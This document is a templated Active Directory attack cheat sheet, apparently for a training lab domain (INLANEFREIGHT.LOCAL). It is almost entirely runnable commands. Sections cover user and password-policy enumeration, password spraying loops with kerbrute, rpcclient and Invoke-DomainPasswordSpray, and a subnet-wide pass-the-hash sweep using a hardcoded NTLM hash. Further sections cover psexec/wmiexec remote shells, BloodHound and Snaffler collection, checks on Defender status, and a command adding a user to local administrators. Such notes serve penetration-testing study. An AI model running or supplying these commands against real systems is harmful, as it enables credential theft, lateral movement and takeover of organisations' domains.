#Enumerating & retriving password Policies 
netexec smb $(vselector dcip) -u $(vselector vuser) -p $(vselector vpass) --pass-pol
rpcclient -U "" -N $(vselector dcip)
enum4linux -P $(vselector dcip)
ldapsearch -h $(vselector dcip) -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
#User Enumeration 
enum4linux -U $(vselector dcip)  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
netexec smb $(vselector dcip) --users
ldapsearch -h $(vselector dcip) -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
./windapsearch.py --dc-ip $(vselector dcip) -u "" -U
kerbrute userenum -d $(vselector dcname) --dc $(vselector dcip) /opt/jsmith.txt 
netexec smb $(vselector dcname) -u $(vselector vuser) -p $(vselector vpass) --users
#password Spraying from Linux Host 
for u in $(cat $(vselector usernamepath));do rpcclient -U "$u%$(vselector spraypass)" -c "getusername;quit" $(vselector dcname) | grep Authority; done
kerbrute passwordspray -d $(vselector dname) --dc $(vselector dcip) $(vselector usernamepath)  $(vselector spraypass)
netexec smb $(vselector dcip) -u $(vselector usernamepath) -p $(vselector sprypass) | grep +
netexec smb --local-auth $(vselector tsubnet) -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
# Internal Password Spraying - from Windows
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue 
#Cred Enumeration - from Linux
netexec smb $(vselector dcip) -u $(vselector dcuser) -p $(vselector dcpass) --users
netexec smb $(vselector dcip) -u $(vselector dcuser) -p $(vselector dcpass) --groups
netexec smb $(vselector dcip) -u $(vselector dcuser) -p $(vselector dcpass) --loggedon-users
netexec smb $(vselector dcip) -u $(vselector dcuser) -p $(vselector dcpass) --shares 
netexec smb $(vselector dcip) -u $(vselector dcuser) -p $(vselector dcpass) -M spider_plus --share 'Department Shares' 
smbmap -u $(vselector dcuser) -p $(vselector dcpass) -d $(vselector dcname) -H $(vselector dcip)
smbmap -u $(vselector dcuser) -p $(vselector dcpass) -d $(vselector dcname) -H $(vselector dcip) -R 'Department Shares' --dir-only
rpcclient -U "" -N $(vselector dcip)
psexec.py $(vselector dcname)/$(vselector dcuser):'$(vselector dcpass)'@$(vselector dcip) 
wmiexec.py $(vselector dcname)/$(vselector dcuser):'$(vselector dcpass)'@$(vselector dcip) 
bloodhound-python -u '$(vselector dcuser)' -p '$(vselector dcpass)' -d $(vselector dcname) -dc $(vselector dcname) -ns $(vselector dcip) -c All --auth-method ntlm --zip 
bloodhound-python -u '$(vselector dcuser)' -p '$(vselector dcpass)' -d $(vselector dcname) -dc $(vselector dcname) -ns $(vselector dcip) -c All --zip
#creds Enumeration - from windows 
Get-Module
Get-ADDomain
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
Get-ADTrust -Filter *
Get-ADGroup -Filter * | select name
Get-ADGroup -Identity "Backup Operators"
Get-ADGroupMember -Identity "Backup Operators"
Get-DomainUser -Identity $(vselector dcuser) -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
Get-DomainTrustMapping
Get-DomainTrustMapping
Test-AdminAccess -ComputerName ACADEMY-EA-MS01
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
.\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data
.\SharpHound.exe -c All --zipfilename ILFREIGHT <-> to collect all the data from ad of course this work with windows only 
#Some WD cmds : 
netsh advfirewall show allprofiles <-> this command show the current configration of windows furewall 
sc query windefend <-> show the status of windows defender 
Get-MpComputerStatus <-> this to show the anabled&desabled settings 
qwinsta <-> show all local session 
#Windows Managment Instrumentation 
wmic qfe get Caption,Description,HotFixID,InstalledOn <-> Prints the patch level and description of the Hotfixes applied
wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List <-> Displays basic host information to include any attributes within the list
wmic process list /format:list <-> A listing of all processes on host
wmic ntdomain list /format:list <-> Displays information about the Domain and Domain Controllers
wmic useraccount list /format:list <-> Displays information about all local accounts and any domain accounts that have logged into the device
wmic group list /format:list <-> Information about all local groups
wmic sysaccount list /format:list <-> Dumps information about any system accounts that are being used as service accounts.
#Useful Net Commands
net accounts <-> Information about password requirements
net accounts /domain <-> Password and lockout policy
net group /domain <-> Information about domain groups
net group "Domain Admins" /domain <-> List users with domain admin privileges
net group "domain computers" /domain <-> List of PCs connected to the domain
net group "Domain Controllers" /domain <-> List PC accounts of domains controllers
net group <domain_group_name> /domain <-> User that belongs to the group
net groups /domain <-> List of domain groups
net localgroup <-> All available groups
net localgroup administrators /domain <-> List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default)
net localgroup Administrators <-> Information about a group (admins)
net localgroup administrators [username] /add <-> Add user to administrators
net share <-> Check current shares
net user <ACCOUNT_NAME> /domain <-> Get information about a user within the domain
net user /domain <-> List all users of the domain
net user %username% <-> Information about the current user
net use x: \computer\share <-> Mount the share locally
net view <-> Get a list of computers
net view /all /domain[:domainname] <-> Shares on the domains
net view \computer /ALL <-> List shares of a computer
net view /domain <-> List of PCs of the domain
#Dsquery DLL
dsquery user <-> list all user on da ad 
dsquery compute <-> list all computer 
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL" <-> wildcard search 
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl <-> Users With Specific Attributes Set (PASSWD_NOTREQD) 
